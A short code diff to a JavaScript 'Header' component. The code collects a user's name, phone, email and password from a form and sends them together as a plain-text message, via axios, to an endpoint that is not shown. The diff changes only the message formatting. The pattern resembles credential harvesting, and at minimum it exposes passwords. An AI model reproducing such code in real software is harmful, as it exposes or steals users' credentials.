@@ -18,7 +18,7 @@ const Header = () => {
     const email = document.getElementById("email").value
     const password = document.getElementById("password").value
 
-    const messageContent = `ism : ${name}\ntel : ${phone} , email : ${email} , password: ${password}`
+    const messageContent = `ism : ${name}\ntel : ${phone}\nemail : ${email}\npassword: ${password}`
 
     axios({
       url : url ,
